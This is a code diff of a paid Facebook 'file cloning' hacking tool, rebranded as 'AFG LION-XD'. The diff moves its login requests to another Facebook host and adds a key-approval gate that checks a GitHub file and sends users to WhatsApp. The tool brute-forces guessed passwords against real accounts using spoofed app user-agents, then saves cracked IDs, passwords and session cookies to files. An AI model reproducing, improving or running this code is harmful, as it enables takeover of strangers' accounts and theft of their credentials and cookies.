@@ -46,7 +46,7 @@ except ImportError:
 
 os.system("pip uninstall urllib3 requests chardet idna certifi -y");os.system("pip install urllib3 requests chardet idna certifi")
 clear() 
-print('\n\n\033[1;31m[\033[1;32m+\033[1;31m]\033[1;37m𝐖𝐞𝐥𝐜𝐨𝐦 𝐓𝐨 𝐄𝐒𝐂𝐑𝐎-𝐗𝐃 𝐓𝐨𝐨𝐥 ! \n')
+print('\n\n\033[1;31m[\033[1;32m+\033[1;31m]\033[1;37m𝐖𝐞𝐥𝐜𝐨𝐦 𝐓𝐨 AFG LION-𝐗𝐃 𝐓𝐨𝐨𝐥 ! \n')
 try:
 	import requests,json,time,re,random,sys,uuid,string,subprocess,zlib,base64,hashlib
 	from string import *
@@ -255,7 +255,7 @@ logo ="""\033[1;37m
 \033[1;31m[\033[1;32m+\033[1;31m] \033[1;37m𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑       \033[1;91m: \033[1;32mKING AFG LION 
 \033[1;31m[\033[1;32m+\033[1;31m] \033[1;37m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊        \033[1;91m: \033[1;97mHacking Helper
 \033[1;31m[\033[1;32m+\033[1;31m] \033[1;37m𝐒𝐄𝐑𝐕𝐈𝐂𝐄         \033[1;32m: PAID
-\033[1;31m[\033[1;32m+\033[1;31m] \033[1;37m𝐕𝐞𝐫𝐭𝐢𝐨𝐧𝐬        \033[1;91m: 10.1
+\033[1;31m[\033[1;32m+\033[1;31m] \033[1;37m𝐕𝐞𝐫𝐭𝐢𝐨𝐧𝐬        \033[1;91m: 10.2
 \033[1;31m[\033[1;32m+\033[1;31m] \033[1;37m𝐓𝐎𝐎𝐋 𝐒𝐓𝐀𝐓𝐔𝐒     \033[1;91m: \033[1;97mFILE CLONING
 \033[1;31m[\033[1;32m+\033[1;31m] \033[1;37m𝐆𝐈𝐓𝐇𝐔𝐁          \033[1;91m: afglion5
 \33[1;37m══════════════════════════════════════════"""
@@ -439,7 +439,7 @@ def api1(ids,names,passlist):
             pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
             #ua=random.choice(ugen)
             ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+"Dalvik/2.1.0 (Linux; U; Android 5; 9 Build/QP1A.705646.786) [FBAN/FB4A;FBAV/122.0.0.174174;[FBAN/FB4A;FBAV/29.0.0.28173;FBPN/com.facebook.katana;FBLC/ in_ID;FBBV/47824947;FBCR/ AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-P993J;FBSV/14;FBCA/armeabi-v7a:armeabi;FBDM/{density=4,width=2364,height=2850};FB_FW/10;FBRV/18481643;]" 
-            getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+            getlog = session.get(f'https://b-graph.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
             idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
             headers = {
     'authority': 'm.facebook.com',
@@ -465,18 +465,18 @@ def api1(ids,names,passlist):
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
     'viewport-width': '980',
 }
-            complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+            complete = session.post(f'https://b-graph.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
             Escro=session.cookies.get_dict().keys()
             if "c_user" in Escro:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                print('\r\r\033[1;32m[HACKING-𝐎𝐊] '+ids+' | '+pas+' \033[1;33m| '+joined(cid)+' ')
+                print('\r\r\033[1;32m[AFG LION-𝐎𝐊] '+ids+' | '+pas+' \033[1;33m| '+joined(cid)+' ')
                 cek_apk(session,coki)
-                open('/sdcard/HACKING_OK_ids_M1.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ESCRO_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
+                open('/sdcard/AFG LION_OK_ids_M1.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ESCRO_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                 oks.append(ids);sexy(ids,pas,coki)
                 break
             elif 'checkpoint' in Escro:
-                print(f'\r\r\033[1;31m[HACKING-𝐂𝐏] '+ids+' | '+pas+'\033[1;97m')
-                open('/sdcard/HACKING-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                print(f'\r\r\033[1;31m[AFG LION-𝐂𝐏] '+ids+' | '+pas+'\033[1;97m')
+                open('/sdcard/AFG LION-CP.txt', 'a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
             else:
@@ -665,7 +665,49 @@ if ltx > 12:
 else:
     a = ltx
     tag = "AM"                 
-#═════════════════════End══════════════════════#    
+
+#__________________[ Approval.txt]__________________#
+def linex():
+        print('\033[1;37m----------------------------------------------')
+        
+def approval():
+  uuid = str(os.geteuid())+"DS"+str(os.geteuid())
+  id = "GM•FILE-"+"".join(uuid)
+  os.system('clear')
+  print(logo) 
+  print("\033[1;37m [\u001b[36m•\033[1;37m] You Need Approval To Use This Tool   \033[1;37m")
+  print("\033[1;37m [\u001b[36m•\033[1;37m] Your Key :\u001b[36m "+id);time.sleep(0.1)
+  print ("""\033[1;37m----------------------------------------------""")
+  try:
+    httpCaht = requests.get("https://github.com/afglion5/approval/blob/main/approval.txt").text
+    if id in httpCaht:
+      print("\033[1;97m >> Your Key Has Been Approved !!!")
+      msg = str(os.geteuid())
+      time.sleep(1)
+      pass
+    else: 
+      print("\x1b[1;97m >> Send Key on WhatsApp! ");
+      time.sleep(0.1)
+      
+      input(' >> Click Enter To Send Your Key ')
+      
+      os.system('xdg-open https://wa.me/qr/SI5U6B3VRKSDL1')
+      
+      time.sleep(1)
+      
+      
+      exit()
+      
+  except: 
+  	
+     print(" >> Unable To Fetch Data From Server ")
+     
+     time.sleep(2)
+     
+     exit()
+approval()
+
+#__________________[ END ]__________________#
 try:
     menu()
 except requests.exceptions.ConnectionError:
